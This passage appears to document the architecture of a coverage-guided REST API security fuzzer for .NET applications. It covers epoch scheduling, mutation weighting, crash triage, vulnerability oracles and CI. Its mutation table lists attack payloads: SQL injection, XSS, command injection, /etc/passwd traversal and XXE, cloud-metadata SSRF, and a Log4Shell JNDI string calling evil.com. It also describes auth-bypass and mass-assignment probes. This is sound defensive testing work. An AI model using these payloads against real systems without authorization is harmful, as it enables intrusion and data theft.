distinguish *genuinely new exploration* from re-treading a known workflow,
which the coverage bitmap alone cannot: a 3rd identical `GET` after a `POST`
looks the same to the bitmap as the 1st, but carries no new information for
the sequence search.

`enqueueSequenceFollowups` tracks every signature seen this run
(`f.seenStateSigs`, a plain map — sequence processing runs entirely on the
single main-loop goroutine that drains `resultCh`, so no locking is needed).
Reaching a never-seen signature:
- Awards a state-novelty energy bonus (`stateNoveltyBonus = 5.0`, chosen to be
  comparable to a solid multi-edge `CoverageDelta` hit) to the sequence's
  `Energy`, which feeds `maybePersistSequence`'s "did this sequence produce
  real value" gate.
- Widens that step's fanout by one extra branch (capped at `len(followups)`),
  giving newly-discovered states one more unit of search budget than a
  re-tread of a known shape gets.

`maybePersistSequence` additionally dedups the on-disk workflow report
(`persistWorkflow`, JSON+curl repro scripts) by **final** shape
(`f.persistedWorkflowSigs`): two sequences reaching the identical shape via
different concrete data are only written to disk once, closing the "no dedup
of equivalent workflows" gap. `printFinalReport` surfaces both counters:
`Sequence engine: new_states_found=N unique_workflows_persisted=M`.

This is explicitly a *coarse* state-reward mechanism, not the full typed
state-graph / coverage-directed-fanout search DeepREST/EvoMaster implement —
see `ARCHITECTURE_REVIEW.md` §5 for what remains open.

### Self-verifying, fail-closed instrumentation (Top-20 #4)

`coverage.go::checkCoverageHealth` runs once, right after templates are loaded
(`fuzzer.go::Run`, before the main epoch loop starts), and by default refuses
to start a run whose instrumentation looks broken rather than silently
fuzzing blind for the whole time budget:

1. **Fetch `/shm/health`.** If the endpoint is unreachable, or `shm_bound` is
   `false` (the coverage pointer was never bound at all), that's an immediate
   fail — there's no plumbing to verify further.
2. **Send a real warm-up probe.** Up to 3 templates are rendered unmutated
   (`renderTemplate(tid, "none", 0, -1)`) and sent for real
   (`sendOne`) — this deliberately reuses the exact same request-building path
   the Baseline epoch uses moments later, not a synthetic health-check
   request.
3. **Check whether the shared bitmap actually moved.** `coverage.GetEdges()`
   before vs. after the probe is the only architecturally honest signal
   available: SharpFuzz uses one flat shared bitmap with hashed offsets and no
   per-assembly attribution, so there is no way to ask ".NET side, did
   assembly X specifically get instrumented" — the `Trace.SharedMem` type
   these probes bind to lives only in `SharpFuzz.Common.dll`, never in the
   app's own IL-rewritten assemblies. If edges are still flat despite
   `shm_bound=true` (a target that is reachable, responds normally to every
   request, and even reports app assemblies loaded — but was never actually
   IL-rewritten, e.g. wrong image, wrong `--src`, or a namespace excluded by
   `--exclude-namespaces`), the run is refused.

By default this is a hard failure (`run failed: coverage instrumentation
degraded: ...`, non-zero exit). Pass `-allow-degraded-coverage` to downgrade
it to a warning and continue anyway (not recommended — only useful for
debugging the instrumentation pipeline itself). This was validated against a
real design mistake: an earlier draft tried to compute an "ok"/"degraded"
verdict on the .NET side by checking whether each app assembly *itself*
defined the `SharpFuzz.Common.Trace` type — which is never true by
construction, so it flagged every healthy target as degraded. The
`fixtures/planted-bug-api/` E2E run (`scripts/e2e-test.sh`, Top-20 #7) caught
this before it shipped, which is exactly the kind of regression that fixture
exists to catch.

### Epoch Architecture

The time budget is divided into four epochs with automatic transitions:

```
Time Budget
|------+--------+------------------------+-------------|
|  5%  |  30%   |          50%           |    15%      |
| Base |  Det   |         Havoc          |  Splicing   |
| line |        |   (depth escalation)   | (cross-seed)|
```

| Epoch | Budget | Description |
|-------|--------|-------------|
| **Baseline** | 5% | Send every template **unmutated**. Populates seed corpus. The maximum coverage reached at the end of this epoch is saved as the `coverage_baseline_ceiling` to act as the denominator for saturation (rather than the raw bitmap capacity). |
| **Deterministic** | 30% | Pick seed by energy, apply **one mutation** per field. Systematic, methodical exploration. |
| **Havoc** | 50% | Pick seed, apply **1-4 stacked mutations**. Depth starts at 1, escalates on coverage stall. |
| **Splicing** | 15% | Pick **two** seeds, use one's template + havoc mutations. Cross-pollinates payloads. |

### Mutation Engine (MOpt-Style Weighted Categories)

Mutations are organized into categories with adaptive weights — categories that discover more coverage edges get higher selection probability:

| Category | Weight | Example Payloads |
|----------|--------|-----------------|
| `boundary` | 1.0 | `""`, `null`, `NaN`, `Infinity` |
| `overflow` | 1.0 | `AAA...` × 100, 1024, 5000, 10000 |
| `sqli` | 1.5 | `' OR '1'='1`, `'; DROP TABLE--`, UNION SELECTs |
| `xss` | 1.5 | `<script>alert(1)`, SVG/img onload, JS proto |
| `cmdi` | 1.5 | `; id`, `` `id` ``, `$(id)` |
| `path_traversal` | 1.5 | `../../../etc/passwd`, encoded variants |
| `ssrf` | 1.5 | AWS/GCP metadata URLs, `file:///`, `dict://` |
| `ssti` | 1.5 | `{{7*7}}`, `${7*7}`, `#{7*7}` |
| `open_redirect` | 1.0 | `//evil.com`, `\\/evil.com` |
| `crlf` | 1.0 | `\r\nX-Injected: pwned` |
| `log4shell` | 1.0 | `${jndi:ldap://evil.com/x}` |
| `nosqli` | 1.0 | `{"$gt":""}`, `{"$where":"sleep(5000)"}` |
| `ldap` | 1.0 | `*)(uid=*))(|(uid=*` |
| `xxe` | 1.0 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
| `unicode` | 1.0 | Zero-width chars, homoglyphs, BOM, RTL |
| `json` | 1.0 | Mass assignment, deep nesting, array overflow, .NET type confusion |

> **Mutation Stacking:** During the `Havoc` and `Splicing` epochs, the engine dynamically chains 2 to 4 mutations together on a single payload. For example, applying `json_dotnet_deser` (injecting `$type` for type confusion) followed by `json_deep_nest` (wrapping the newly injected `$type` in 100 levels of nested dictionaries) allows the fuzzer to organically synthesize highly complex exploits that would be impossible to hardcode in a static dictionary.

### Dynamic Mutation Weights (MOpt Feedback Loop)
The engine does not just randomly pick mutations; it implements an MOpt-style scheduler. Every time a mutation category (e.g., `json` or `sqli`) discovers a **new coverage edge** (verified via the SHM bitmap), its `hitRate` increases. 
- **Weight update formula:** `weight = 1.0 + (hitRate × 4.0)` (scaling up to a maximum 5× multiplier).
This means that if the target application is heavily vulnerable to JSON manipulations but immune to SQLi, the engine will dynamically shift its statistical probability to fire significantly more JSON payloads over time.

### Seed Corpus & Energy Scheduling

A **seed** = saved (template + rendered payload) pair. Corpus = all seeds.

**Lifecycle & Energy Calculation:**
1. **Baseline** → unmutated renderings populate initial corpus
2. **Growth** → mutated requests that find new edges become new seeds
3. **Surprise Factor** → When a heavily-fuzzed endpoint (e.g., hit 10,000 times) suddenly yields a new edge, the assigned energy scales logarithmically: `1.0 + Log2(Requests)`. If it is the first new edge in a long time, the multiplier is multiplied by `3.0`. This heavily favors deep, rare business logic transitions over shallow API surface mapping.
4. **Selection** → Fenwick tree weighted random by **energy**
5. **Boosting** → +5 energy per new edge discovered by a seed's mutations
6. **Decay & Minimization** → 0.5% energy decay per pick (`Energy * 0.995`) prevents starvation and local maximum traps. When the corpus exceeds 500 items, exhausted seeds are pruned to maintain Fenwick tree efficiency.

### Coverage-Guided Loop

```
for each batch (N = concurrency):
    before_edges = read_coverage()    ← mmap or HTTP
    tasks = [send_request(r) for r in batch]
    results = await all tasks         ← parallel HTTP goroutines
    after_edges = read_coverage()
    batch_delta = after_edges - before_edges

    if batch_delta > 0:
        → Save high-delta requests as new seeds
        → Boost energy of contributing seeds
        → Reset stall counter
    else:
        → Increment stall counter
        → After N stalls: increase havoc depth
```

### Coverage Reading Modes

| Mode | How | Overhead |
|------|-----|----------|
| **HTTP** (default) | `GET /shm/coverage` — one HTTP round-trip per `-coverage-interval` requests; returns bucketed distinct-class count | Low (~1ms) |
| **Direct SHM** (`-direct-shm`) | `mmap.read(bitmap)` on `/coverage_shm/bitmap`; Go side runs its own bucketed virgin-map scan (`countClass`) | Near-zero |
| **Per-request header** | `X-Coverage-Delta` = buckets this request first discovered (single-scan, first-observer-wins) injected by middleware | One bitmap pass per request (no extra round-trip) |

### Advanced Features

| Feature | Description |
|---------|-------------|
| **Crash triage** | Re-probes 5xx with same payload; calculates Triage Score (detects layer: pre-auth crashes like deserialization are capped at `needs_review`); generates curl PoC |
| **Crash minimization** | Binary search through request payload removing fields until crash fails to repro |
| **Race condition probing** | Sends `-race-burst` parallel identical requests to probe TOCTOU conditions |
| **Multi-identity** | Rotates through multiple auth tokens for authorization bypass testing |
| **Anti-forgery tokens** | Discovers HTML `<input>` token fields, pools and rotates them automatically |
| **Source-aware priority** | Boosts endpoints backed by detected business logic files from `-src` |
| **Adaptive concurrency** | PID-style controller adjusts goroutine count based on error rate |
| **Sequence fanout** | Builds producer→consumer chains using runtime-extracted response IDs |

### Triage Scoring System
UpsideFuzz assigns a heuristic **Triage Score (0.0 to 10.0)** to every discovered crash to filter noise and prioritize critical vulnerabilities.

1. **Base Score (+4.0):** Automatically assigned for any `500 Internal Server Error`.
2. **Dev Stack Leak (+1.5):** Added if the response body contains developer stack traces (e.g., `stack trace`, `exception:`).
3. **Backend Exception (+1.6):** Added if the body reveals critical backend failures (e.g., `sql`, `deadlock`, `nullreferenceexception`).
4. **Sensitive Path (Up to +1.1):** Boosts crashes on high-value endpoints (e.g., `/admin`, `/auth`) via `sensitivePathScore`.
5. **Stateful Trigger (+0.9):** Added if the crash was triggered by a complex Sequence Engine mutation (indicating deep business logic failure).
6. **Penalties:** 
   - `-1.5` for crashes on purely synthetic/non-existent paths (`/api/fuzzstring`).
   - `-2.0` for generic content-type mismatch noise.

**Classification Labels (honest tiers):**
A `likely_vuln*` label **requires a concrete exploitation signal** — a bare 500 never earns it.
- **`likely_vuln_high` / `likely_vuln`**: An exploitation oracle fired (see below) — BOLA/IDOR, broken auth, time-based SQLi, evaluated SSTI, reflected XSS, file read, or SSRF.
- **`confirmed_unhandled_exception`** (score `>= 6.0`, no exploit signal): Reproducible 500 with a backend stack trace — a robustness/DoS bug, *not* a proven vulnerability.
- **`needs_review`** (score `>= 4.0`): A 500 that could not be attributed. Malformed-input parse exceptions (bad GUID/base64) are down-ranked into this tier so they stop masquerading as real code bugs.
- **`target_misconfiguration`**: DI/service-resolution failure (e.g. an unregistered service) — a build/config artifact of the instrumented image, excluded from the vulnerability count.
- **`noise`** (`< 4.0`): Filtered.

### Root-Cause Clustering (`cluster.go`)
The per-crash signature folds in path and mutation, so one bug reached from many routes/payloads yields many signatures — massively over-counting distinct bugs (a real run produced 933 "unique" crashes for ~5 actual bugs). `cluster.go` adds a **ClusterKey** that groups crashes by root cause: the normalized backend exception message plus the first *application* stack frame (framework frames skipped). When no exception detail is available (production mode), it falls back to a coarsened `(method, status, path-template)` key. The report exposes `distinct_root_causes` and a `root_cause_clusters` roll-up — the honest "how many real bugs" number.

### Vulnerability Oracles (`oracle.go`)
Because a 500 is only a robustness signal, UpsideFuzz adds oracles that reuse the multi-identity and mutation machinery to detect *actual* vulnerabilities:
- **BOLA/IDOR + broken auth:** After any successful resource-scoped request under an authenticated identity, the identical request is replayed under every *other* identity and with *no* credentials. A 2xx returning a real body to a different or anonymous principal is a Broken Object-Level Authorization or broken-authentication finding (`access_control: true`, `origin_identity` → `shadow_identity`). Identical bodies score `likely_vuln_high`; differing 2xx bodies score `likely_vuln` and are flagged for manual verification. **Auth-bypass precondition:** the no-credential probe only fires on endpoints the engine has already seen reject unauthenticated access (401/403) — tracked in `authRequiredEndpoints` with a strength (2 = rejected an unauthenticated caller, 1 = rejected someone). A truly public endpoint never accumulates evidence, so it is never flagged, eliminating the public-endpoint false positive. Each oracle has its own flag (`-probe-bola`, `-probe-auth-bypass`, `-probe-mass-assign`) under the `-access-probe` master toggle.
- **Mass assignment:** After a successful write (POST/PUT/PATCH with a JSON object body), the body is re-sent with privileged fields over-posted (`isAdmin`, `role:"SuperAdmin"`, `permissions:["*"]`, `accessLevel:99999`, …). If the server echoes an injected privileged field back with its injected value, it accepted an over-posted field — reported `likely_vuln` (`mass_assignment_privileged_field_accepted`). Values are chosen to be unlikely natural states to keep false positives low.
- **Positive injection:** On non-crash responses where a security-category payload was applied, the engine detects time-based SQLi (latency ≥ threshold and ≥3× baseline on sleep/benchmark payloads), evaluated SSTI (rare arithmetic markers such as `{{1337*1337}}` → `1787569` present but not merely reflected), and reflected XSS. The mutation registry also includes a `dotnet_deser` category of Json.NET `$type` gadget payloads for insecure-deserialization detection.
- **Differential / parser-confusion auth bypass (Top-20 #18):** `oracle.go::maybeEnqueueDifferentialProbes` fires after a successful, resource-scoped request under an authenticated identity, but **only** on endpoints with *strong* evidence of auth enforcement — `authRequiredEndpoints` strength 2, meaning a plain credential-free request was already rejected with 401/403. That precondition is what makes this a distinct class from plain auth-bypass: it's not "does removing auth work" (already tested), it's "does removing auth work *when combined with a confusion technique* that already-failed literal replay didn't use." Four independent NoAuth probe variants, each gated on being structurally applicable to the origin request:
  - **verb** — GET origin replayed as HEAD only (semantically "GET minus body", so a bypass is a genuine same-data finding; mutating verbs are excluded since they'd change request semantics, not just authorization).
  - **content-type** — identical body bytes, `Content-Type` swapped from `application/json` to `text/plain;charset=UTF-8` (some auth/CSRF middleware only gates requests declared as JSON).
  - **route-case** — `swapPathSegmentCase` flips the first letter of each path segment (ASP.NET routing is case-insensitive by default; custom auth-attribute/WAF/reverse-proxy path matching sometimes isn't).
  - **param-location** — `appendQueryParam` duplicates the path-embedded resource id as a same-named query parameter (tests whether a differently-sourced same-named parameter routes through a different model-binding/authorization path; deliberately duplicates the *same* id rather than a differently-owned one — true cross-tenant object-ownership testing needs the ownership-matrix infra that is Top-20 #8, still open).

  A 2xx with a real, non-error-shaped body on any variant is `likely_vuln_high` (`differential_auth_bypass:<technique>`), reusing `recordAccessControlFinding` with the technique folded into both the dedup key (so all 4 techniques on one endpoint are tracked as distinct findings, not deduped against each other) and the triage `technique` field. Gated by `-probe-differential` under the `-access-probe` master toggle.

### Profiles (`-profile`)
To tame the 90-flag surface, `-profile fast|deep|security` applies a curated bundle of defaults — but only to flags the user did **not** explicitly pass (tracked via `flag.Visit`), so any individual flag still wins. `security` prioritizes the oracles and multi-identity coverage; `deep` is a balanced thorough scan; `fast` maximizes throughput for CI.

### Sequence Engine & Fallback Mechanics
The Sequence Engine actively stitches complex API workflows (e.g., `POST /stores` → extracts ID → `PUT /stores/{id}`). 
- **Trigger Rate:** Dictated by the `-sequence-prob` flag (e.g., `0.35` means 35% of all executions are actively stitched sequences).
- **Fallback Validation:** If a producer request fails (e.g., validation error preventing store creation), the downstream consumer lacks a valid ID. Instead of failing or passing a literal unresolved placeholder (e.g., `_api_v1_stores_post_id` — the naming convention `grammarc/dependencies.py` also follows for its own payload keys), the engine dynamically falls back to generating fuzzed variables (e.g., randomly generated UUIDs, `NaN`, `-Infinity`). This ensures that even "failed" sequences result in robust Resource-Based Authorization and input validation testing against downstream endpoints.

---

## 8. SHM Architecture: Why Shared Memory?

HTTP coverage polling (the fallback) adds ~0.5–2ms per batch. At high concurrency (64+ workers), this becomes a meaningful bottleneck. Direct SHM mode eliminates it entirely:

| Method | Throughput (est.) | Overhead | Notes |
|--------|-------------------|----------|-------|
| HTTP JSON (`GET /shm/coverage`) | ~300–600 req/s cap | TCP + routing + serialization | Works everywhere, no volume needed |
| File-backed mmap (`-direct-shm`) | 2000+ req/s | ~microseconds (OS page cache) | Requires `coverage_shm` tmpfs volume (Docker sidecar mode) |

How file-backed mmap works across containers:

```
  [App Container]                    [Fuzzer Container]
  /coverage_shm/bitmap               /coverage_shm/bitmap
        ↑                                   ↓
        └─────── Docker tmpfs volume ────────┘
                  (same physical pages)

  SharpFuzz probes write at every branch
  Go fuzzer reads bitmap every N requests
  → zero HTTP overhead, zero serialization
```

---

## 9. Verified Projects

These targets have current quickstarts, prepared trees, or active benchmark material in this workspace:

| Project | Type | Services | Notes |
|---------|------|---------|-------|
| **Bitwarden** | OSS password manager backend | MSSQL, Identity service, Migrator | Multi-user auth, strict validation, multi-identity fuzzing |
| **BTCPayServer** | OSS payment platform | PostgreSQL, NBXplorer, Bitcoin stack | Greenfield API, API-key auth, larger service graph |
| **eShopOnWeb** | OSS sample store API | SQL Server | Smallest end-to-end target in the repo; `PublicApi` is main project |
| **SimplCommerce** | OSS modular e-commerce | SQL Server, MVC/auth stack | Cookie auth and anti-forgery-heavy target |

---

## 10. Project File Map (Current State)

```
upside-fuzzer/
│
├── fuzz-prep-multi.py          ★ Main tool: analyze, instrument, adapt Dockerfile/compose
├── compile-grammar.sh          ★ Compile swagger.json → templates.export.json + dict.json
│                                 (grammarc/ + optional analyzer/ — no RESTler, no Docker)
├── upsidefuzz.py               ★ Single CLI orchestrator (Top-20 #19) — wraps the pipeline
│                                 below behind instrument/build/up/down/verify/grammar/fuzz/run
├── upsidefuzz                  Zero-install Docker launcher for upsidefuzz.py (see Dockerfile.cli)
├── Dockerfile.cli               Image bundling Python + .NET SDK + void for the launcher above
│
├── grammarc/                   ★ First-party OpenAPI → typed grammar compiler (Python, stdlib)
│   ├── oas.py                  OpenAPI 2/3 parser ($ref/allOf/oneOf/anyOf resolution)
│   ├── body_serializer.py      Schema → static/fuzzable/custom_payload segment serializer
│   ├── dependencies.py         Producer/consumer id inference (path/name convention)
│   ├── roslyn_merge.py         Merges analyzer/'s type-scoped constraints over OpenAPI's
│   ├── boundary.py             Boundary-value synthesis
│   ├── multipart.py            Multipart/form-data template synthesis
│   ├── emit_templates.py       Writes templates.export.json (fixes the payload_key bug)
│   ├── emit_dict.py            Writes dict.json
│   └── cli.py                  python3 -m grammarc.cli entry point
│
├── analyzer/                   ★ Roslyn syntax-tree analyzer (C#, Microsoft.CodeAnalysis.CSharp)
│   ├── SourceIndex.cs          Parses all .cs files; partial-class/enum/validator indexing
│   ├── ConstraintWalker.cs     DataAnnotations constraints, type/property-scoped
│   ├── FluentValidationWalker.cs   RuleFor(...) chain walking via real syntax nodes
│   ├── RouteAuthWalker.cs      [Authorize]/route metadata (controller + minimal-API styles)
│   └── analyzer.csproj
│
├── INSTRUCTIONS.md             ★ Complete runbook (instrument → fuzz → analyze)
├── ARCHITECTURE.md             ★ Platform internals, diagrams, SHM design
├── README.md                   Overview, features, structure
├── QUICKSTART_BITWARDEN.md     Target-specific setup for Bitwarden
├── QUICKSTART_BTCPAYSERVER.md  Target-specific setup for BTCPayServer
├── QUICKSTART_ESHOP.md         Target-specific setup for eShopOnWeb
├── QUICKSTART_SIMPLCOMMERCE.md Target-specific setup for SimplCommerce
├── docs/
│   ├── FUZZER_AUTHENTICATION.md
│   └── auth.identities.example.json
│
├── instrumentor/               Reference instrumentor source + build script
│   ├── Program.cs              Standalone generic config-driven instrumentor
│   ├── instrument.sh           Build + run script
│   └── instrumentor.csproj     Project file
│
├── void/
│   ├── export-templates.py     Legacy fallback: old grammar.py → JSON templates
│   │                           (pre-migration grammars only; primary path never touches this)
│   ├── Dockerfile.go           Container image for the Go fuzzer sidecar
│   ├── README.md               Go fuzzer reference (flags, startup fields, build)
│   ├── go/
│   │   ├── main.go             ★ CLI flags and bootstrap
│   │   ├── fuzzer.go           Main lifecycle hooks and epoch scheduling
│   │   ├── worker.go           Core HTTP fuzzing loop and coverage tracking
│   │   ├── coverage.go         SHM bitmap parsing and HTTP coverage reader
│   │   ├── sequence.go         Stateful producer/consumer chains
│   │   ├── template.go         templates.export.json parsing and rendering
│   │   ├── store.go            Runtime value harvesting and deduplication
│   │   ├── mutation_engine.go  MOpt-style mutation scheduler
│   │   ├── mutations.go        Payload mutation categories
│   │   ├── auth.go             JWT/header/cookie auth state and login fallback
│   │   ├── identity.go         Multi-identity scheduling and race helpers
│   │   ├── cluster.go          Root-cause clustering (many signatures → one bug)
│   │   ├── oracle.go           BOLA/IDOR + auth-bypass + injection oracles
│   │   ├── triage.go           Source-aware triage and scoring logic
│   │   ├── poc.go              PoC shell scripts and timelines
│   │   ├── report.go           JSON bug report builder
│   │   ├── minimize.go         Crash minimization and repro logic
│   │   ├── ui.go               Terminal UI and plain logging
│   │   ├── utils.go            Common helpers and constants
│   │   ├── types.go            Core data structures
│   │   ├── go.mod
│   │   ├── identity_test.go
│   │   └── poc_test.go
│
├── grammars/
│   ├── bitwarden/              Generated grammar, dict, templates, and security overlay
│   ├── btcpay/                 Generated grammar, dict, and templates
│   ├── eshop/                  Generated grammar, dict, and templates
│   └── simplcommerce/          Generated grammar, dict, and templates
│
├── restler_bin/                Inert leftover from before RESTler was retired (Top-20 #9);
│                                 safe to delete, nothing reads or writes it anymore
│
├── bitwarden_prep/             Target tree + helper scripts for Bitwarden
├── btcpayserver/               Raw BTCPayServer checkout
├── btcpayserver_prep/          Instrumented BTCPayServer tree
├── eshprep/                    Instrumented eShopOnWeb tree
├── simplcommerce_prep/         Instrumented SimplCommerce tree
├── examples/
│   └── simplcommerce/          SimplCommerce-specific helper scripts and namespace config
├── benchmarks/                 Paper helpers and benchmark post-processing
├── crashes/                    Fuzzer outputs, PoCs, timelines, and reports
├── fixtures/
│   └── planted-bug-api/        Minimal DB-free ASP.NET Core app used by the E2E CI gate
├── scripts/
│   └── e2e-test.sh             E2E regression gate (see §11)
└── .github/workflows/e2e.yml   CI entry point for scripts/e2e-test.sh
```

---

## 11. Continuous Integration (E2E regression gate)

Top-20 #7 — this project's first CI of any kind, added 2026-07-23 as a direct regression
safety net for `grammarc/`+`analyzer/` (#9/#10) and the mutation-engine changes (#14/#11),
none of which had any automated coverage before this existed.

`.github/workflows/e2e.yml` runs `scripts/e2e-test.sh` on every push/PR. The script proves
the **whole pipeline**, not just that each stage exits zero:

```
fuzz-prep-multi.py (instrument fixtures/planted-bug-api)
        │
docker compose build && up -d
        │
verify-hook.sh (zero-edit coverage hook sanity: /shm/create, /shm/health,
                 synthetic-404 attribution, real-endpoint edge growth)
        │
compile-grammar.sh (OAS-only — no --src needed for this small fixture)
        │
void -time-budget 1  (short live fuzz run against the real container)
        │
assert: summary.json.coverage_end_edges > 0
assert: unique-crashes.jsonl contains a GET /items?...  status_code=500 record
        (the planted ArgumentOutOfRangeException — see fixtures/planted-bug-api/README.md)
```

`fixtures/planted-bug-api/` is deliberately minimal (in-memory data, no DB, no external
services) and nested under `src/PlantedBugApi/` — a flat single-project layout collides
with the generated Dockerfile's `COPY . ./` + implicit `**/*.cs` glob, which would also
pull in the tool's own sibling `instrumentor_src/Program.cs` (itself top-level
statements) into the same compile, producing `CS8802: Only one compilation unit can have
top-level statements`. Nesting one level down avoids this the same way every real target
in this repo already does. The fixture's `ListItems` handler also lives on a named,
non-lambda class (`ItemHandlers`) rather than inline in `app.MapGet(...)` — SharpFuzz
instrumentation blanket-excludes any type whose name contains `+<>c` (compiler-generated
lambda/closure classes) to prevent a real, previously-hit static-initializer crash class
(see `instrumentor/Program.cs::ShouldInstrument`'s own comment) — but that exclusion also
silently zeroes out coverage for logic written directly inline in minimal-API lambdas,
confirmed empirically while building this fixture (0 SHM edges from real traffic before
the restructuring, real edge growth after).

Building this fixture and script also surfaced and fixed three real, previously-unknown
bugs elsewhere in the pipeline — see `ARCHITECTURE_REVIEW.md`'s Inconsistencies section,
items 8–10, for the full writeups: a substring-vs-path-segment matching bug in
`analyzer/RoslynUtil.IsTestPath`, `analyzer/RouteAuthWalker` never scanning top-level-
statement `Program.cs` files for minimal-API routes, and a bash-3.2-specific unbound-array
crash in `compile-grammar.sh` when `--src` is omitted.
